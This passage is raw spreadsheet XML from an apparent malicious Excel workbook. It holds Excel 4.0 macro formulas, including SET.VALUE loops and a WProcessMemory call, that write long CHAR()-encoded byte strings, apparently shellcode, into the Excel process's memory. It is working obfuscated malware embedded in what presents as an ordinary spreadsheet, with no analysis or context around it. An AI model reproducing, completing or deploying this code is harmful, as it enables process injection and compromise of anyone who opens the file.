amp;CHAR(18)&amp;CHAR(132)&amp;CHAR(207)&amp;CHAR(101)&amp;CHAR(26)&amp;CHAR(238)&amp;CHAR(112)&amp;CHAR(187)&amp;CHAR(217)&amp;CHAR(123)&amp;CHAR(69)&amp;CHAR(65)&amp;CHAR(132)&amp;CHAR(189)&amp;CHAR(241)&amp;CHAR(9)&amp;CHAR(31)&amp;CHAR(244)&amp;CHAR(158)&amp;CHAR(237)&amp;CHAR(209)&amp;CHAR(39)&amp;CHAR(189)&amp;CHAR(163)&amp;CHAR(5)&amp;CHAR(79)&amp;CHAR(214)&amp;CHAR(45)&amp;CHAR(90)&amp;CHAR(118)&amp;CHAR(109)&amp;CHAR(55)&amp;CHAR(123)&amp;CHAR(80)&amp;CHAR(43)&amp;CHAR(245)&amp;CHAR(211)&amp;CHAR(180)&amp;CHAR(247)&amp;CHAR(97)&amp;CHAR(119)&amp;CHAR(25)&amp;CHAR(156)&amp;CHAR(197)&amp;CHAR(69)&amp;CHAR(223)&amp;CHAR(130)&amp;CHAR(235)&amp;CHAR(6)&amp;CHAR(29)&amp;CHAR(42)&amp;CHAR(74)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(27)&amp;CHAR(192)&amp;CHAR(254)&amp;CHAR(26)&amp;CHAR(224)&amp;CHAR(137)&amp;CHAR(217)&amp;CHAR(203)&amp;CHAR(104)&amp;CHAR(144)&amp;CHAR(88)&amp;CHAR(62)&amp;CHAR(19)&amp;CHAR(216)&amp;CHAR(91)&amp;CHAR(130)&amp;CHAR(254)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(46)&amp;CHAR(150)&amp;CHAR(182)&amp;CHAR(114)&amp;CHAR(35)&amp;CHAR(169)&amp;CHAR(213)&amp;CHAR(83)&amp;CHAR(43)&amp;CHAR(67)&amp;CHAR(62)&amp;CHAR(140)&amp;CHAR(144)&amp;CHAR(82)&amp;CHAR(29)&amp;CHAR(40)&amp;CHAR(52)&amp;CHAR(41)&amp;CHAR(89)&amp;CHAR(184)&amp;CHAR(221)&amp;CHAR(194)&amp;CHAR(155)&amp;CHAR(188)&amp;CHAR(81)&amp;CHAR(249)&amp;CHAR(219)&amp;CHAR(182)&amp;CHAR(212)&amp;CHAR(13)&amp;CHAR(61)&amp;CHAR(12)&amp;CHAR(141)&amp;CHAR(195)&amp;CHAR(168)&amp;CHAR(169)&amp;CHAR(118)&amp;CHAR(6)&amp;CHAR(180)&amp;CHAR(232)&amp;CHAR(225)&amp;CHAR(176)&amp;CHAR(210)&amp;CHAR(198)&amp;CHAR(156)&amp;CHAR(25)&amp;CHAR(118)&amp;CHAR(168)&amp;CHAR(149)&amp;CHAR(189)&amp;CHAR(192)&amp;CHAR(140)&amp;CHAR(37)&amp;CHAR(160)&amp;CHAR(149)&amp;CHAR(71)&amp;CHAR(11)&amp;CHAR(113)&amp;CHAR(69)&amp;CHAR(154)&amp;CHAR(120)&amp;CHAR(28)&amp;CHAR(226)&amp;CHAR(247)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(229)&amp;CHAR(198)&amp;CHAR(194)&amp;CHAR(46)&amp;CHAR(87)&amp;CHAR(157)&amp;CHAR(36)&amp;CHAR(172)&amp;CHAR(20)&amp;CHAR(255)&amp;CHAR(200)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(74)&amp;CHAR(41)&amp;CHAR(161)&amp;CHAR(9)&amp;CHAR(103)&amp;CHAR(43)&amp;CHAR(170)&amp;CHAR(172)&amp;CHAR(121)&amp;CHAR(241)&amp;CHAR(225)&amp;CHAR(202)&amp;CHAR(92)&amp;CHAR(113)&amp;CHAR(230)&amp;CHAR(81)&amp;CHAR(145)&amp;CHAR(172)&amp;CHAR(120)&amp;CHAR(46)&amp;CHAR(152)&amp;CHAR(149)&amp;CHAR(216)&amp;CHAR(205)&amp;CHAR(220)</f>
        <v>Ê0Wh¬;Å_x000F_\hlêâ1}£Ö¦Jwôß¯n¤3 ó«Kï_x0005_wò%aƒ‡«_x0004_yb_x001D_Æ*É¶ÕY_x0007_û_x000B_?=_x0017_o¼OfšÑ&amp;£¬ _x0018_#_x0011_‚!_x000B_N${9_x000C__x0012_„Ïe_x001A_îp»Ù{EA„½ñ	_x001F_ôžíÑ'½£_x0005_OÖ-Zvm7{P+õÓ´÷aw_x0019_œÅEß‚ë_x0006__x001D_*JM_x001B_Àþ_x001A_à‰ÙËhX&gt;_x0013_Ø[‚þ_x0006_).–¶r#©ÕS+C&gt;ŒR_x001D_(4)Y¸ÝÂ›¼QùÛ¶Ô_x000D_=_x000C_Ã¨©v_x0006_´èá°ÒÆœ_x0019_v¨•½ÀŒ% •G_x000B_qEšx_x001C_â÷_x0001__x0005_åÆÂ.W$¬_x0014_ÿÈÃJ)¡	g+ª¬yñáÊ\qæQ‘¬x.˜•ØÍÜ</v>
      </c>
      <c r="C13" t="str">
        <f>CHAR(147)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(118)&amp;CHAR(192)&amp;CHAR(19)&amp;CHAR(229)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>“Ž¿vÀ_x0013_åë»ë</v>
      </c>
    </row>
    <row r="14" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A14" t="b">
        <f>SET.VALUE(D1,LEN(main))</f>
        <v>0</v>
      </c>
      <c r="B14" t="str">
        <f>CHAR(97)&amp;CHAR(75)&amp;CHAR(55)&amp;CHAR(167)&amp;CHAR(189)&amp;CHAR(156)&amp;CHAR(38)&amp;CHAR(2)&amp;CHAR(56)&amp;CHAR(108)&amp;CHAR(110)&amp;CHAR(142)&amp;CHAR(28)&amp;CHAR(76)&amp;CHAR(32)&amp;CHAR(213)&amp;CHAR(83)&amp;CHAR(8)&amp;CHAR(148)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(43)&amp;CHAR(113)&amp;CHAR(43)&amp;CHAR(207)&amp;CHAR(43)&amp;CHAR(107)&amp;CHAR(42)&amp;CHAR(43)&amp;CHAR(247)&amp;CHAR(11)&amp;CHAR(147)&amp;CHAR(71)&amp;CHAR(204)&amp;CHAR(116)&amp;CHAR(246)&amp;CHAR(221)&amp;CHAR(122)&amp;CHAR(117)&amp;CHAR(218)&amp;CHAR(117)&amp;CHAR(253)&amp;CHAR(90)&amp;CHAR(245)&amp;CHAR(110)&amp;CHAR(181)&amp;CHAR(169)&amp;CHAR(148)&amp;CHAR(221)&amp;CHAR(84)&amp;CHAR(40)&amp;CHAR(3)&amp;CHAR(23)&amp;CHAR(174)&amp;CHAR(4)&amp;CHAR(61)&amp;CHAR(85)&amp;CHAR(31)&amp;CHAR(202)&amp;CHAR(120)&amp;CHAR(126)&amp;CHAR(193)&amp;CHAR(41)&amp;CHAR(233)&amp;CHAR(147)&amp;CHAR(87)&amp;CHAR(83)&amp;CHAR(46)&amp;CHAR(159)&amp;CHAR(85)&amp;CHAR(67)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(228)&amp;CHAR(160)&amp;CHAR(9)&amp;CHAR(45)&amp;CHAR(58)&amp;CHAR(75)&amp;CHAR(77)&amp;CHAR(134)&amp;CHAR(87)&amp;CHAR(102)&amp;CHAR(16)&amp;CHAR(142)&amp;CHAR(219)&amp;CHAR(76)&amp;CHAR(241)&amp;CHAR(61)&amp;CHAR(166)&amp;CHAR(223)&amp;CHAR(156)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(235)&amp;CHAR(188)&amp;CHAR(13)&amp;CHAR(118)&amp;CHAR(174)&amp;CHAR(1)&amp;CHAR(36)&amp;CHAR(207)&amp;CHAR(96)&amp;CHAR(166)&amp;CHAR(60)&amp;CHAR(33)&amp;CHAR(48)&amp;CHAR(17)&amp;CHAR(155)&amp;CHAR(145)&amp;CHAR(210)&amp;CHAR(20)&amp;CHAR(54)&amp;CHAR(196)&amp;CHAR(29)&amp;CHAR(121)&amp;CHAR(219)&amp;CHAR(146)&amp;CHAR(107)&amp;CHAR(156)&amp;CHAR(105)&amp;CHAR(166)&amp;CHAR(218)&amp;CHAR(109)&amp;CHAR(149)&amp;CHAR(36)&amp;CHAR(168)&amp;CHAR(248)&amp;CHAR(182)&amp;CHAR(203)&amp;CHAR(237)&amp;CHAR(229)&amp;CHAR(67)&amp;CHAR(228)&amp;CHAR(164)&amp;CHAR(76)&amp;CHAR(93)&amp;CHAR(37)&amp;CHAR(88)&amp;CHAR(122)&amp;CHAR(227)&amp;CHAR(201)&amp;CHAR(57)&amp;CHAR(234)&amp;CHAR(250)&amp;CHAR(33)&amp;CHAR(101)&amp;CHAR(196)&amp;CHAR(51)&amp;CHAR(62)&amp;CHAR(87)&amp;CHAR(102)&amp;CHAR(189)&amp;CHAR(183)&amp;CHAR(67)&amp;CHAR(126)&amp;CHAR(26)&amp;CHAR(17)&amp;CHAR(250)&amp;CHAR(41)&amp;CHAR(35)&amp;CHAR(247)&amp;CHAR(186)&amp;CHAR(164)&amp;CHAR(170)&amp;CHAR(107)&amp;CHAR(40)&amp;CHAR(29)&amp;CHAR(129)&amp;CHAR(45)&amp;CHAR(177)&amp;CHAR(125)&amp;CHAR(160)&amp;CHAR(125)&amp;CHAR(25)&amp;CHAR(218)&amp;CHAR(162)&amp;CHAR(150)&amp;CHAR(103)&amp;CHAR(194)&amp;CHAR(39)&amp;CHAR(176)&amp;CHAR(32)&amp;CHAR(204)&amp;CHAR(69)&amp;CHAR(124)&amp;CHAR(169)&amp;CHAR(122)&amp;CHAR(240)&amp;CHAR(227)&amp;CHAR(224)&amp;CHAR(151)&amp;CHAR(228)&amp;CHAR(150)&amp;CHAR(144)&amp;CHAR(210)&amp;CHAR(52)&amp;CHAR(45)&amp;CHAR(111)&amp;CHAR(177)&amp;CHAR(12)&amp;CHAR(82)&amp;CHAR(168)&amp;CHAR(59)&amp;CHAR(46)&amp;CHAR(192)&amp;CHAR(69)&amp;CHAR(209)&amp;CHAR(190)&amp;CHAR(132)&amp;CHAR(235)&amp;CHAR(203)&amp;CHAR(211)&amp;CHAR(30)&amp;CHAR(172)&amp;CHAR(150)&amp;CHAR(138)&amp;CHAR(169)&amp;CHAR(227)&amp;CHAR(63)&amp;CHAR(76)&amp;CHAR(234)&amp;CHAR(163)&amp;CHAR(81)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(151)&amp;CHAR(239)&amp;CHAR(118)&amp;CHAR(107)&amp;CHAR(5)&amp;CHAR(23)&amp;CHAR(64)&amp;CHAR(112)&amp;CHAR(59)&amp;CHAR(177)&amp;CHAR(59)&amp;CHAR(6)&amp;CHAR(101)&amp;CHAR(50)&amp;CHAR(253)&amp;CHAR(246)&amp;CHAR(27)&amp;CHAR(231)&amp;CHAR(203)&amp;CHAR(146)&amp;CHAR(191)&amp;CHAR(109)&amp;CHAR(54)&amp;CHAR(96)&amp;CHAR(208)&amp;CHAR(212)&amp;CHAR(196)&amp;CHAR(12)&amp;CHAR(213)</f>
        <v>aK7§½œ&amp;_x0002_8lnŽ_x001C_L ÕS_x0008_”_x0004_	+q+Ï+k*+÷_x000B_“GÌtöÝzuÚuýZõnµ©”ÝT(_x0003__x0017_®_x0004_=U_x001F_Êx~Á)é“WS.ŸUC_x000C__x000B_ä 	-:KM†Wf_x0010_ŽÛLñ=¦ßœ_x0003_€ë¼_x000D_v®_x0001_$Ï`¦&lt;!0_x0011_›‘Ò_x0014_6Ä_x001D_yÛ’kœi¦Úm•$¨ø¶ËíåCä¤L]%XzãÉ9êú!eÄ3&gt;Wf½·C~_x001A__x0011_ú)#÷º¤ªk(_x001D_-±} }_x0019_Ú¢–gÂ'° ÌE|©zðãà—ä–Ò4-o±_x000C_R¨;.ÀEÑ¾„ëËÓ_x001E_¬–Š©ã?Lê£Q&gt;±—ïvk_x0005__x0017_@p;±;_x0006_e2ýö_x001B_çË’¿m6`ÐÔÄ_x000C_Õ</v>
      </c>
      <c r="C14" t="str">
        <f>CHAR(191)&amp;CHAR(126)&amp;CHAR(50)&amp;CHAR(46)&amp;CHAR(132)&amp;CHAR(98)&amp;CHAR(75)&amp;CHAR(163)&amp;CHAR(122)&amp;CHAR(232)</f>
        <v>¿~2.„bK£zè</v>
      </c>
    </row>
    <row r="15" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A15" t="e">
        <f>WProcessMemory(-1,A9+(#REF!*255),main,LEN(main),0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B15" t="str">
        <f>CHAR(50)&amp;CHAR(26)&amp;CHAR(157)&amp;CHAR(238)&amp;CHAR(230)&amp;CHAR(240)&amp;CHAR(16)&amp;CHAR(148)&amp;CHAR(33)&amp;CHAR(169)&amp;CHAR(32)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(99)&amp;CHAR(200)&amp;CHAR(205)&amp;CHAR(95)&amp;CHAR(163)&amp;CHAR(11)&amp;CHAR(231)&amp;CHAR(185)&amp;CHAR(81)&amp;CHAR(4)&amp;CHAR(104)&amp;CHAR(219)&amp;CHAR(220)&amp;CHAR(119)&amp;CHAR(103)&amp;CHAR(195)&amp;CHAR(88)&amp;CHAR(124)&amp;CHAR(69)&amp;CHAR(69)&amp;CHAR(131)&amp;CHAR(176)&amp;CHAR(151)&amp;CHAR(134)&amp;CHAR(102)&amp;CHAR(1)&amp;CHAR(54)&amp;CHAR(66)&amp;CHAR(104)&amp;CHAR(9)&amp;CHAR(127)&amp;CHAR(96)&amp;CHAR(226)&amp;CHAR(151)&amp;CHAR(110)&amp;CHAR(213)&amp;CHAR(50)&amp;CHAR(198)&amp;CHAR(126)&amp;CHAR(31)&amp;CHAR(12)&amp;CHAR(198)&amp;CHAR(166)&amp;CHAR(236)&amp;CHAR(20)&amp;CHAR(201)&amp;CHAR(37)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(160)&amp;CHAR(118)&amp;CHAR(169)&amp;CHAR(87)&amp;CHAR(31)&amp;CHAR(63)&amp;CHAR(214)&amp;CHAR(169)&amp;CHAR(96)&amp;CHAR(141)&amp;CHAR(227)&amp;CHAR(17)&amp;CHAR(75)&amp;CHAR(120)&amp;CHAR(196)&amp;CHAR(230)&amp;CHAR(100)&amp;CHAR(44)&amp;CHAR(108)&amp;CHAR(243)&amp;CHAR(186)&amp;CHAR(236)&amp;CHAR(115)&amp;CHAR(207)&amp;CHAR(82)&amp;CHAR(19)&amp;CHAR(128)&amp;CHAR(254)&amp;CHAR(192)&amp;CHAR(21)&amp;CHAR(73)&amp;CHAR(115)&amp;CHAR(168)&amp;CHAR(49)&amp;CHAR(55)&amp;CHAR(137)&amp;CHAR(10)&amp;CHAR(28)&amp;CHAR(93)&amp;CHAR(254)&amp;CHAR(55)&amp;CHAR(59)&amp;CHAR(91)&amp;CHAR(182)&amp;CHAR(54)&amp;CHAR(11)&amp;CHAR(82)&amp;CHAR(200)&amp;CHAR(254)&amp;CHAR(109)&amp;CHAR(35)&amp;CHAR(203)&amp;CHAR(60)&amp;CHAR(200)&amp;CHAR(178)&amp;CHAR(111)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(224)&amp;CHAR(251)&amp;CHAR(12)&amp;CHAR(58)&amp;CHAR(154)&amp;CHAR(72)&amp;CHAR(188)&amp;CHAR(128)&amp;CHAR(177)&amp;CHAR(109)&amp;CHAR(92)&amp;CHAR(34)&amp;CHAR(233)&amp;CHAR(102)&amp;CHAR(106)&amp;CHAR(68)&amp;CHAR(54)&amp;CHAR(138)&amp;CHAR(14)&amp;CHAR(156)&amp;CHAR(167)&amp;CHAR(159)&amp;CHAR(158)&amp;CHAR(155)&amp;CHAR(27)&amp;CHAR(171)&amp;CHAR(96)&amp;CHAR(246)&amp;CHAR(160)&amp;CHAR(41)&amp;CHAR(70)&amp;CHAR(60)&amp;CHAR(62)&amp;CHAR(37)&amp;CHAR(254)&amp;CHAR(18)&amp;CHAR(19)&amp;CHAR(110)&amp;CHAR(121)&amp;CHAR(118)&amp;CHAR(150)&amp;CHAR(169)&amp;CHAR(34)&amp;CHAR(71)&amp;CHAR(209)&amp;CHAR(192)&amp;CHAR(177)&amp;CHAR(129)&amp;CHAR(187)&amp;CHAR(206)&amp;CHAR(14)&amp;CHAR(29)&amp;CHAR(99)&amp;CHAR(120)&amp;CHAR(157)&amp;CHAR(121)&amp;CHAR(244)&amp;CHAR(207)&amp;CHAR(218)&amp;CHAR(175)&amp;CHAR(106)&amp;CHAR(147)&amp;CHAR(130)&amp;CHAR(242)&amp;CHAR(69)&amp;CHAR(87)&amp;CHAR(229)&amp;CHAR(227)&amp;CHAR(171)&amp;CHAR(179)&amp;CHAR(175)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(222)&amp;CHAR(169)&amp;CHAR(250)&amp;CHAR(190)&amp;CHAR(245)&amp;CHAR(242)&amp;CHAR(44)&amp;CHAR(104)&amp;CHAR(55)&amp;CHAR(153)&amp;CHAR(23)&amp;CHAR(206)&amp;CHAR(178)&amp;CHAR(98)&amp;CHAR(163)&amp;CHAR(198)&amp;CHAR(132)&amp;CHAR(180)&amp;CHAR(146)&amp;CHAR(160)&amp;CHAR(221)&amp;CHAR(52)&amp;CHAR(139)&amp;CHAR(6)&amp;CHAR(244)&amp;CHAR(211)&amp;CHAR(141)&amp;CHAR(37)&amp;CHAR(9)&amp;CHAR(237)&amp;CHAR(144)&amp;CHAR(200)&amp;CHAR(162)&amp;CHAR(169)&amp;CHAR(171)&amp;CHAR(126)&amp;CHAR(84)&amp;CHAR(59)&amp;CHAR(187)&amp;CHAR(25)&amp;CHAR(159)&amp;CHAR(203)&amp;CHAR(11)&amp;CHAR(254)&amp;CHAR(30)&amp;CHAR(51)&amp;CHAR(34)&amp;CHAR(85)&amp;CHAR(106)&amp;CHAR(216)&amp;CHAR(201)&amp;CHAR(45)&amp;CHAR(167)&amp;CHAR(52)&amp;CHAR(26)&amp;CHAR(141)&amp;CHAR(119)&amp;CHAR(166)&amp;CHAR(149)&amp;CHAR(159)&amp;CHAR(91)&amp;CHAR(207)</f>
        <v>2_x001A_îæð_x0010_”!© _x0007_GcÈÍ_£_x000B_ç¹Q_x0004_hÛÜwgÃX|EEƒ°—†f_x0001_6Bh	`â—nÕ2Æ~_x001F__x000C_Æ¦ì_x0014_É%ô9 v©W_x001F_?Ö©`ã_x0011_KxÄæd,lóºìsÏR_x0013_€þÀ_x0015_Is¨17‰
_x001C_]þ7;[¶6_x000B_RÈþm#Ë&lt;È²oªTàû_x000C_:šH¼€±m\"éfjD6Š_x000E_œ§Ÿž›_x001B_«`ö )F&lt;&gt;%þ_x0012__x0013_nyv–©"GÑÀ±»Î_x000E__x001D_cxyôÏÚ¯j“‚òEWåã«³¯ˆFÞ©ú¾õò,h7™_x0017_Î²b£Æ„´’ Ý4‹_x0006_ôÓ%	íÈ¢©«~T;»_x0019_ŸË_x000B_þ_x001E_3"UjØÉ-§4_x001A_w¦•Ÿ[Ï</v>
      </c>
      <c r="C15" t="str">
        <f>CHAR(68)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(102)&amp;CHAR(250)&amp;CHAR(97)&amp;CHAR(242)&amp;CHAR(54)</f>
        <v>D0Íëófúaò6</v>
      </c>
    </row>
    <row r="16" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A16" t="b">
        <f>SET.VALUE(#REF!,#REF!+1)</f>
        <v>0</v>
      </c>
      <c r="B16" t="str">
        <f>CHAR(195)&amp;CHAR(149)&amp;CHAR(173)&amp;CHAR(252)&amp;CHAR(118)&amp;CHAR(31)&amp;CHAR(157)&amp;CHAR(147)&amp;CHAR(189)&amp;CHAR(51)&amp;CHAR(13)&amp;CHAR(187)&amp;CHAR(182)&amp;CHAR(23)&amp;CHAR(207)&amp;CHAR(205)&amp;CHAR(92)&amp;CHAR(55)&amp;CHAR(123)&amp;CHAR(230)&amp;CHAR(68)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(21)&amp;CHAR(181)&amp;CHAR(186)&amp;CHAR(34)&amp;CHAR(207)&amp;CHAR(139)&amp;CHAR(128)&amp;CHAR(252)&amp;CHAR(62)&amp;CHAR(233)&amp;CHAR(102)&amp;CHAR(224)&amp;CHAR(220)&amp;CHAR(103)&amp;CHAR(233)&amp;CHAR(117)&amp;CHAR(91)&amp;CHAR(56)&amp;CHAR(159)&amp;CHAR(204)&amp;CHAR(79)&amp;CHAR(50)&amp;CHAR(190)&amp;CHAR(113)&amp;CHAR(198)&amp;CHAR(171)&amp;CHAR(97)&amp;CHAR(170)&amp;CHAR(233)&amp;CHAR(104)&amp;CHAR(141)&amp;CHAR(80)&amp;CHAR(115)&amp;CHAR(115)&amp;CHAR(217)&amp;CHAR(1)&amp;CHAR(227)&amp;CHAR(26)&amp;CHAR(96)&amp;CHAR(198)&amp;CHAR(158)&amp;CHAR(210)&amp;CHAR(28)&amp;CHAR(146)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(124)&amp;CHAR(200)&amp;CHAR(146)&amp;CHAR(81)&amp;CHAR(58)&amp;CHAR(146)&amp;CHAR(251)&amp;CHAR(53)&amp;CHAR(44)&amp;CHAR(36)&amp;CHAR(130)&amp;CHAR(17)&amp;CHAR(245)&amp;CHAR(173)&amp;CHAR(76)&amp;CHAR(181)&amp;CHAR(4)&amp;CHAR(248)&amp;CHAR(199)&amp;CHAR(117)&amp;CHAR(44)&amp;CHAR(181)&amp;CHAR(104)&amp;CHAR(75)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(194)&amp;CHAR(48)&amp;CHAR(158)&amp;CHAR(59)&amp;CHAR(2)&amp;CHAR(232)&amp;CHAR(202)&amp;CHAR(21)&amp;CHAR(126)&amp;CHAR(130)&amp;CHAR(48)&amp;CHAR(148)&amp;CHAR(250)&amp;CHAR(230)&amp;CHAR(70)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(97)&amp;CHAR(163)&amp;CHAR(59)&amp;CHAR(98)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(126)&amp;CHAR(189)&amp;CHAR(249)&amp;CHAR(123)&amp;CHAR(154)&amp;CHAR(7)&amp;CHAR(245)&amp;CHAR(88)&amp;CHAR(123)&amp;CHAR(118)&amp;CHAR(224)&amp;CHAR(63)&amp;CHAR(22)&amp;CHAR(255)&amp;CHAR(14)&amp;CHAR(80)&amp;CHAR(199)&amp;CHAR(131)&amp;CHAR(129)&amp;CHAR(253)&amp;CHAR(141)&amp;CHAR(180)&amp;CHAR(220)&amp;CHAR(222)&amp;CHAR(193)&amp;CHAR(181)&amp;CHAR(22)&amp;CHAR(55)&amp;CHAR(139)&amp;CHAR(1)&amp;CHAR(234)&amp;CHAR(92)&amp;CHAR(153)&amp;CHAR(17)&amp;CHAR(39)&amp;CHAR(128)&amp;CHAR(252)&amp;CHAR(168)&amp;CHAR(243)&amp;CHAR(123)&amp;CHAR(254)&amp;CHAR(9)&amp;CHAR(220)&amp;CHAR(159)&amp;CHAR(116)&amp;CHAR(136)&amp;CHAR(194)&amp;CHAR(160)&amp;CHAR(44)&amp;CHAR(193)&amp;CHAR(98)&amp;CHAR(254)&amp;CHAR(140)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(33)&amp;CHAR(75)&amp;CHAR(251)&amp;CHAR(15)&amp;CHAR(91)&amp;CHAR(15)&amp;CHAR(190)&amp;CHAR(14)&amp;CHAR(66)&amp;CHAR(252)&amp;CHAR(45)&amp;CHAR(191)&amp;CHAR(57)&amp;CHAR(108)&amp;CHAR(33)&amp;CHAR(180)&amp;CHAR(67)&amp;CHAR(154)&amp;CHAR(120)&amp;CHAR(38)&amp;CHAR(131)&amp;CHAR(133)&amp;CHAR(78)&amp;CHAR(150)&amp;CHAR(61)&amp;CHAR(68)&amp;CHAR(43)&amp;CHAR(143)&amp;CHAR(245)&amp;CHAR(92)&amp;CHAR(137)&amp;CHAR(129)&amp;CHAR(120)&amp;CHAR(23)&amp;CHAR(2)&amp;CHAR(31)&amp;CHAR(108)&amp;CHAR(250)&amp;CHAR(67)&amp;CHAR(153)&amp;CHAR(174)&amp;CHAR(134)&amp;CHAR(7)&amp;CHAR(67)&amp;CHAR(83)&amp;CHAR(228)&amp;CHAR(225)&amp;CHAR(114)&amp;CHAR(138)&amp;CHAR(67)&amp;CHAR(250)&amp;CHAR(225)&amp;CHAR(78)&amp;CHAR(41)&amp;CHAR(105)&amp;CHAR(46)&amp;CHAR(226)&amp;CHAR(154)&amp;CHAR(158)&amp;CHAR(168)&amp;CHAR(199)&amp;CHAR(130)&amp;CHAR(80)&amp;CHAR(214)&amp;CHAR(93)&amp;CHAR(86)&amp;CHAR(1)&amp;CHAR(32)&amp;CHAR(42)&amp;CHAR(87)&amp;CHAR(239)&amp;CHAR(203)&amp;CHAR(212)&amp;CHAR(16)&amp;CHAR(137)&amp;CHAR(128)&amp;CHAR(141)&amp;CHAR(235)&amp;CHAR(140)&amp;CHAR(208)&amp;CHAR(167)</f>
        <v>Ã•­üv_x001F_“½3_x000D_»¶_x0017_ÏÍ\7{æD‚é_x0015_µº"Ï‹€ü&gt;éfàÜgéu[8ŸÌO2¾qÆ«aªéhPssÙ_x0001_ã_x001A_`ÆžÒ_x001C_’ZW|È’Q:’û5,$‚_x0011_õ­Lµ_x0004_øÇu,µhKÂ†‚Â0ž;_x0002_èÊ_x0015_~‚0”úæF‚_x0002_a£;b!†~½ù{š_x0007_õX{và?_x0016_ÿ_x000E_PÇƒý´ÜÞÁµ_x0016_7‹_x0001_ê\™_x0011_'€ü¨ó{þ	ÜŸtˆÂ ,ÁbþŒy_x0002_!Kû_x000F_[_x000F_¾_x000E_Bü-¿9l!´Cšx&amp;ƒ…N–=D+õ\‰x_x0017__x0002__x001F_lúC™®†_x0007_CSäárŠCúáN)i.âšž¨Ç‚PÖ]V_x0001_ *WïËÔ_x0010_‰€ëŒÐ§</v>
      </c>
      <c r="C16" t="str">
        <f>CHAR(205)&amp;CHAR(3)&amp;CHAR(17)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(187)&amp;CHAR(192)&amp;CHAR(40)</f>
        <v>Í_x0003__x0011_ï÷ý¼»À(</v>
      </c>
    </row>
    <row r="17" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A17" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>0</v>
      </c>
      <c r="B17" t="str">
        <f>CHAR(124)&amp;CHAR(180)&amp;CHAR(190)&amp;CHAR(199)&amp;CHAR(212)&amp;CHAR(90)&amp;CHAR(82)&amp;CHAR(3)&amp;CHAR(153)&amp;CHAR(43)&amp;CHAR(122)&amp;CHAR(126)&amp;CHAR(2)&amp;CHAR(12)&amp;CHAR(100)&amp;CHAR(145)&amp;CHAR(7)&amp;CHAR(250)&amp;CHAR(215)&amp;CHAR(195)&amp;CHAR(91)&amp;CHAR(59)&amp;CHAR(198)&amp;CHAR(86)&amp;CHAR(75)&amp;CHAR(255)&amp;CHAR(218)&amp;CHAR(197)&amp;CHAR(45)&amp;CHAR(82)&amp;CHAR(171)&amp;CHAR(166)&amp;CHAR(15)&amp;CHAR(182)&amp;CHAR(95)&amp;CHAR(118)&amp;CHAR(100)&amp;CHAR(115)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(34)&amp;CHAR(162)&amp;CHAR(56)&amp;CHAR(59)&amp;CHAR(138)&amp;CHAR(201)&amp;CHAR(3)&amp;CHAR(107)&amp;CHAR(118)&amp;CHAR(175)&amp;CHAR(248)&amp;CHAR(87)&amp;CHAR(83)&amp;CHAR(137)&amp;CHAR(27)&amp;CHAR(68)&amp;CHAR(29)&amp;CHAR(89)&amp;CHAR(247)&amp;CHAR(150)&amp;CHAR(254)&amp;CHAR(104)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(110)&amp;CHAR(99)&amp;CHAR(88)&amp;CHAR(26)&amp;CHAR(70)&amp;CHAR(226)&amp;CHAR(2)&amp;CHAR(126)&amp;CHAR(99)&amp;CHAR(151)&amp;CHAR(13)&amp;CHAR(38)&amp;CHAR(176)&amp;CHAR(151)&amp;CHAR(206)&amp;CHAR(197)&amp;CHAR(160)&amp;CHAR(14)&amp;CHAR(9)&amp;CHAR(177)&amp;CHAR(225)&amp;CHAR(43)&amp;CHAR(155)&amp;CHAR(36)&amp;CHAR(114)&amp;CHAR(233)&amp;CHAR(91)&amp;CHAR(128)&amp;CHAR(239)&amp;CHAR(185)&amp;CHAR(91)&amp;CHAR(178)&amp;CHAR(185)&amp;CHAR(115)&amp;CHAR(32)&amp;CHAR(67)&amp;CHAR(51)&amp;CHAR(89)&amp;CHAR(233)&amp;CHAR(248)&amp;CHAR(191)&amp;CHAR(235)&amp;CHAR(124)&amp;CHAR(244)&amp;CHAR(197)&amp;CHAR(16)&amp;CHAR(190)&amp;CHAR(215)&amp;CHAR(166)&amp;CHAR(185)&amp;CHAR(141)&amp;CHAR(2)&amp;CHAR(31)&amp;CHAR(71)&amp;CHAR(116)&amp;CHAR(140)&amp;CHAR(166)&amp;CHAR(221)&amp;CHAR(209)&amp;CHAR(191)&amp;CHAR(82)&amp;CHAR(231)&amp;CHAR(97)&amp;CHAR(224)&amp;CHAR(70)&amp;CHAR(235)&amp;CHAR(20)&amp;CHAR(208)&amp;CHAR(217)&amp;CHAR(124)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(132)&amp;CHAR(31)&amp;CHAR(54)&amp;CHAR(45)&amp;CHAR(225)&amp;CHAR(55)&amp;CHAR(46)&amp;CHAR(250)&amp;CHAR(208)&amp;CHAR(64)&amp;CHAR(2)&amp;CHAR(220)&amp;CHAR(53)&amp;CHAR(90)&amp;CHAR(240)&amp;CH